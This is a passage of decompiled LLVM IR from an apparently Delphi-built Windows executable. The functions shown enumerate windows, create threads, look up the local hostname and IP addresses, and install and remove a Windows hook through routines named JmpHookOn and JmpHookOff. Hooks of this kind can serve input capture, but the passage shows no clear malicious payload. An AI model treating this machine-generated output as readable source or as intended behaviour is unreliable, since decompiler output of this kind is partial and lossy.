dec_label_pc_4070d4:                              ; preds = %dec_label_pc_4070b0, %dec_label_pc_4070d4
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_406f9c(), !insn.addr !1806
  %12 = call i32 @function_4070b0(), !insn.addr !1807
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1808
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1808
  store i32 2, i32* %14, align 4, !insn.addr !1808
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1809
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1809
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1809
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1810
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1802
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1802
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1803
  %21 = icmp eq i1 %20, false, !insn.addr !1804
  %22 = icmp eq i1 %21, false, !insn.addr !1805
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1805
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1805
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1805
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1805
  br i1 %22, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1805

dec_label_pc_407114:                              ; preds = %dec_label_pc_4070d4, %dec_label_pc_4070b0
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1811
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1812
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1813
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1813
  store i32 4223281, i32* %25, align 4, !insn.addr !1813
  %26 = call i32 @"@LStrClr"(), !insn.addr !1814
  ret i32 %26, !insn.addr !1815
}

define i32 @function_40712a() local_unnamed_addr {
dec_label_pc_40712a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1816
  ret i32 %0, !insn.addr !1816
}

define i32 @function_40712f() local_unnamed_addr {
dec_label_pc_40712f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1817
}

define i32 @function_407131(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407131:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1818
}

define i32 @function_40713c() local_unnamed_addr {
dec_label_pc_40713c:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1819
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1819
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1819
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1820
  %2 = call i32 @function_406fd0(), !insn.addr !1821
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1822
  %4 = call i32 @function_4070b0(), !insn.addr !1823
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1824
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1825
  %6 = call i32 @"@LStrClr"(), !insn.addr !1826
  ret i32 %6, !insn.addr !1827
}

define i32 @function_40719d() local_unnamed_addr {
dec_label_pc_40719d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1828
  ret i32 %0, !insn.addr !1828
}

define i32 @function_4071a2() local_unnamed_addr {
dec_label_pc_4071a2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1829
}

define i32 @function_4071a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4071a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1830
}

define i32 @function_4071bf() local_unnamed_addr {
dec_label_pc_4071bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1831
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1831
  store i32 %3, i32* %4, align 4, !insn.addr !1831
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1832
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1832
  %9 = add i8 %6, %8, !insn.addr !1832
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1832
  store i8 %9, i8* %10, align 1, !insn.addr !1832
  %11 = add i32 %2, 81, !insn.addr !1833
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1833
  %13 = load i8, i8* %12, align 1, !insn.addr !1833
  %14 = trunc i32 %1 to i8, !insn.addr !1833
  %15 = add i8 %13, %14, !insn.addr !1833
  store i8 %15, i8* %12, align 1, !insn.addr !1833
  %16 = load i32, i32* %eax, align 4, !insn.addr !1834
  ret i32 %16, !insn.addr !1834
}

define x86_fp80 @function_4071c7() local_unnamed_addr {
dec_label_pc_4071c7:
  %0 = call x86_fp80 @__decompiler_undefined_function_9()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1835
  ret x86_fp80 %1, !insn.addr !1836
}

define i32 @function_4071cc() local_unnamed_addr {
dec_label_pc_4071cc:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1837
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1838
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1838
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1838
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1839
  %3 = call i32 @function_406fd0(), !insn.addr !1840
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1841
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1842
  %6 = icmp eq i32 %5, 180, !insn.addr !1843
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1844
  br i1 %6, label %dec_label_pc_40722f, label %dec_label_pc_40720a, !insn.addr !1844

dec_label_pc_40720a:                              ; preds = %dec_label_pc_4071cc
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1845
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1846
  %10 = icmp eq i1 %9, false, !insn.addr !1847
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1847
  br i1 %10, label %dec_label_pc_40722f, label %dec_label_pc_407216, !insn.addr !1847

dec_label_pc_407216:                              ; preds = %dec_label_pc_40720a
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1848
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40722f

dec_label_pc_40722f:                              ; preds = %dec_label_pc_407216, %dec_label_pc_4071cc, %dec_label_pc_40720a
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1849
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1850
  %13 = add i32 %esp.1, 8, !insn.addr !1851
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1851
  store i32 4223570, i32* %14, align 4, !insn.addr !1851
  %15 = call i32 @"@LStrClr"(), !insn.addr !1852
  ret i32 %15, !insn.addr !1853
}

define i32 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1854
  ret i32 %0, !insn.addr !1854
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1855
}

define i32 @function_407252(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407252:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1856
}

define i32 @function_407268() local_unnamed_addr {
dec_label_pc_407268:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1857
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1857
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1857
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1858
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1859
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1859
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1860
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1861
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1862
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1863
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1863
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1864
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1865
  %16 = ashr i32 %15, 31, !insn.addr !1866
  %17 = zext i32 %15 to i64, !insn.addr !1867
  %18 = zext i32 %16 to i64, !insn.addr !1867
  %19 = mul i64 %18, 4294967296, !insn.addr !1867
  %20 = or i64 %19, %17, !insn.addr !1867
  %21 = zext i32 %4 to i64, !insn.addr !1867
  %22 = sdiv i64 %20, %21, !insn.addr !1867
  %23 = trunc i64 %22 to i32, !insn.addr !1867
  ret i32 %23, !insn.addr !1868
}

define i32 @function_4072c4() local_unnamed_addr {
dec_label_pc_4072c4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1869
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1870
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1870
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1870
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1871
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1872
  %3 = icmp eq i32 %2, 0, !insn.addr !1872
  br i1 %3, label %dec_label_pc_407300, label %dec_label_pc_4072ed, !insn.addr !1873

dec_label_pc_4072ed:                              ; preds = %dec_label_pc_4072c4
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1874
  store i32 0, i32* %4, align 4, !insn.addr !1874
  br label %dec_label_pc_407300, !insn.addr !1875

dec_label_pc_407300:                              ; preds = %dec_label_pc_4072ed, %dec_label_pc_4072c4
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1876
  %6 = icmp eq i32 %5, 0, !insn.addr !1876
  br i1 %6, label %dec_label_pc_407314, label %dec_label_pc_40730a, !insn.addr !1877

dec_label_pc_40730a:                              ; preds = %dec_label_pc_407300
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1878
  %8 = icmp eq i32 %7, 0, !insn.addr !1878
  %9 = icmp eq i1 %8, false, !insn.addr !1879
  br i1 %9, label %dec_label_pc_40731e, label %dec_label_pc_407314, !insn.addr !1879

dec_label_pc_407314:                              ; preds = %dec_label_pc_40730a, %dec_label_pc_407300
  %10 = call i32 @function_4073f8(), !insn.addr !1880
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1881
  br label %dec_label_pc_4073bb, !insn.addr !1881

dec_label_pc_40731e:                              ; preds = %dec_label_pc_40730a
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1882
  %12 = icmp eq i8 %11, 0, !insn.addr !1882
  br i1 %12, label %dec_label_pc_407347, label %dec_label_pc_407328, !insn.addr !1883

dec_label_pc_407328:                              ; preds = %dec_label_pc_40731e
  %13 = call i32 @function_406be0(), !insn.addr !1884
  %14 = icmp eq i32 %13, 0, !insn.addr !1885
  br i1 %14, label %dec_label_pc_407347, label %dec_label_pc_407340, !insn.addr !1886

dec_label_pc_407340:                              ; preds = %dec_label_pc_407328
  %15 = call i32 @function_4073f8(), !insn.addr !1887
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1888
  br label %dec_label_pc_4073bb, !insn.addr !1888

dec_label_pc_407347:                              ; preds = %dec_label_pc_407328, %dec_label_pc_40731e
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1889
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1890
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 3 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1891
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1892
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1893
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1893
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1894
  %23 = call i32 @function_4073f8(), !insn.addr !1895
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1895
  br label %dec_label_pc_4073bb, !insn.addr !1895

dec_label_pc_4073bb:                              ; preds = %dec_label_pc_407347, %dec_label_pc_407340, %dec_label_pc_407314
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1896
  %25 = load i32, i32* %24, align 4, !insn.addr !1896
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1897
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1898
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1898
  store i32 4223960, i32* %27, align 4, !insn.addr !1898
  %28 = call i32 @"@LStrClr"(), !insn.addr !1899
  ret i32 %28, !insn.addr !1900
}

define i32 @function_4073d1() local_unnamed_addr {
dec_label_pc_4073d1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1901
  ret i32 %0, !insn.addr !1901
}

define i32 @function_4073d6() local_unnamed_addr {
dec_label_pc_4073d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1902
}

define i32 @function_4073d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4073d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1903
}

define i32 @function_4073f8() local_unnamed_addr {
dec_label_pc_4073f8:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1904
  %1 = call i32 @"@LStrClr"(), !insn.addr !1905
  ret i32 %1, !insn.addr !1906
}

define i32 @function_407410() local_unnamed_addr {
dec_label_pc_407410:
  %eax.0.reg2mem = alloca i32, !insn.addr !1907
  %esp.0.reg2mem = alloca i32, !insn.addr !1907
  %esp.15.reg2mem = alloca i32, !insn.addr !1907
  %storemerge6.reg2mem = alloca i32, !insn.addr !1907
  %.reg2mem = alloca i32, !insn.addr !1907
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1907
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1908
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1909
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1910
  %5 = call i32 @"@LStrClr"(), !insn.addr !1911
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1912
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1912
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1913
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1914
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1915
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1915
  %11 = icmp eq %hostent* %9, null, !insn.addr !1916
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1917
  br i1 %11, label %dec_label_pc_40746e, label %dec_label_pc_407448, !insn.addr !1917

dec_label_pc_407448:                              ; preds = %dec_label_pc_407410
  %12 = add i32 %10, 12, !insn.addr !1918
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1918
  %14 = load i32, i32* %13, align 4, !insn.addr !1918
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1919
  %16 = load i32, i32* %15, align 4, !insn.addr !1919
  %17 = icmp eq i32 %16, 0, !insn.addr !1920
  %18 = icmp eq i1 %17, false, !insn.addr !1921
  br i1 %18, label %dec_label_pc_40744f.lr.ph, label %dec_label_pc_407469, !insn.addr !1921

dec_label_pc_40744f.lr.ph:                        ; preds = %dec_label_pc_407448
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1914
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_40744f

dec_label_pc_40744f:                              ; preds = %dec_label_pc_40744f.lr.ph, %dec_label_pc_407461
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1922
  %21 = icmp eq i1 %20, false, !insn.addr !1923
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1923
  br i1 %21, label %dec_label_pc_407461, label %dec_label_pc_407453, !insn.addr !1923

dec_label_pc_407453:                              ; preds = %dec_label_pc_40744f
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1924
  %23 = load i32, i32* %22, align 4, !insn.addr !1924
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1924
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1924
  store i32 %23, i32* %25, align 4, !insn.addr !1924
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1925
  %27 = call i32 @StrPas(), !insn.addr !1926
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1926
  br label %dec_label_pc_407461, !insn.addr !1926

dec_label_pc_407461:                              ; preds = %dec_label_pc_407453, %dec_label_pc_40744f
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1927
  %29 = mul i32 %28, 4, !insn.addr !1919
  %30 = add i32 %29, %14, !insn.addr !1919
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1919
  %32 = load i32, i32* %31, align 4, !insn.addr !1919
  %33 = icmp eq i32 %32, 0, !insn.addr !1920
  %34 = icmp eq i1 %33, false, !insn.addr !1921
  store i32 %32, i32* %.reg2mem, !insn.addr !1921
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1921
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1921
  br i1 %34, label %dec_label_pc_40744f, label %dec_label_pc_407469, !insn.addr !1921

dec_label_pc_407469:                              ; preds = %dec_label_pc_407461, %dec_label_pc_407448
  %35 = call i32 @WSACleanup(), !insn.addr !1928
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1928
  br label %dec_label_pc_40746e, !insn.addr !1928

dec_label_pc_40746e:                              ; preds = %dec_label_pc_407469, %dec_label_pc_407410
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1929
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1930
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1930
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1930
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1931
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1932
  %3 = add i32 %2, 1, !insn.addr !1932
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1932
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1933
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1934
  ret i32 0, !insn.addr !1935
}

define i32 @function_4074a1() local_unnamed_addr {
dec_label_pc_4074a1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1936
  ret i32 %0, !insn.addr !1936
}

define i32 @function_4074a6() local_unnamed_addr {
dec_label_pc_4074a6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1937
}

define i32 @function_4074a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1938
}

define i32 @function_4074ac() local_unnamed_addr {
dec_label_pc_4074ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1939
  %2 = add i32 %1, -1, !insn.addr !1939
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1939
  ret i32 %0, !insn.addr !1940
}

define i32 @function_4074b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1941
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1941
  ret i32 %2, !insn.addr !1942
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_4074d4:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224180 to i32*), i32 3), !insn.addr !1943
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1943
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1944
  %3 = icmp eq i32* %1, null, !insn.addr !1945
  %4 = icmp eq i1 %3, false, !insn.addr !1946
  %5 = sext i1 %4 to i32, !insn.addr !1947
  ret i32 %5, !insn.addr !1948
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407500:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1949
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1950
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1950
  %3 = sext i1 %2 to i32, !insn.addr !1950
  ret i32 %3, !insn.addr !1951
}

define i32 @function_40750c() local_unnamed_addr {
dec_label_pc_40750c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1952
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1952
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1952
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1953
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1954
  %3 = add i32 %2, 1, !insn.addr !1954
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1954
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1955
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1956
  ret i32 0, !insn.addr !1957
}

define i32 @function_407531() local_unnamed_addr {
dec_label_pc_407531:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1958
  ret i32 %0, !insn.addr !1958
}

define i32 @function_407536() local_unnamed_addr {
dec_label_pc_407536:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1959
}

define i32 @function_407538(i32 %arg1) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1960
}

define i32 @function_40753c() local_unnamed_addr {
dec_label_pc_40753c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1961
  %2 = add i32 %1, -1, !insn.addr !1961
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1961
  ret i32 %0, !insn.addr !1962
}

define i32* @function_407544(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_407544:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1963
  ret i32* %0, !insn.addr !1963
}

define i32 @function_40754c() local_unnamed_addr {
dec_label_pc_40754c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1964
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1964
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1964
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1965
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1966
  %3 = add i32 %2, 1, !insn.addr !1966
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1966
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1967
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1968
  ret i32 0, !insn.addr !1969
}

define i32 @function_407571() local_unnamed_addr {
dec_label_pc_407571:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1970
  ret i32 %0, !insn.addr !1970
}

define i32 @function_407576() local_unnamed_addr {
dec_label_pc_407576:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1971
}

define i32 @function_407578(i32 %arg1) local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1972
}

define i32 @function_40757c() local_unnamed_addr {
dec_label_pc_40757c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1973
  %2 = add i32 %1, -1, !insn.addr !1973
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1973
  ret i32 %0, !insn.addr !1974
}

define i32 @function_4075dc(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4075dc:
  %esp.1.reg2mem = alloca i32, !insn.addr !1975
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1975
  %eax.0.reg2mem = alloca i32, !insn.addr !1975
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1976
  %7 = icmp eq i8 %6, 0, !insn.addr !1976
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1977
  br i1 %7, label %dec_label_pc_4075ef, label %dec_label_pc_4075e7, !insn.addr !1977

dec_label_pc_4075e7:                              ; preds = %dec_label_pc_4075dc
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1978
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1978
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1978
  br label %dec_label_pc_4075ef, !insn.addr !1978

dec_label_pc_4075ef:                              ; preds = %dec_label_pc_4075e7, %dec_label_pc_4075dc
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1979
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1980
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1980
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1980
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1981
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1981
  store i32 %13, i32* %15, align 4, !insn.addr !1981
  %16 = icmp eq i32* %12, null, !insn.addr !1982
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1983
  br i1 %16, label %dec_label_pc_407647, label %dec_label_pc_40760b, !insn.addr !1983

dec_label_pc_40760b:                              ; preds = %dec_label_pc_4075ef
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1984
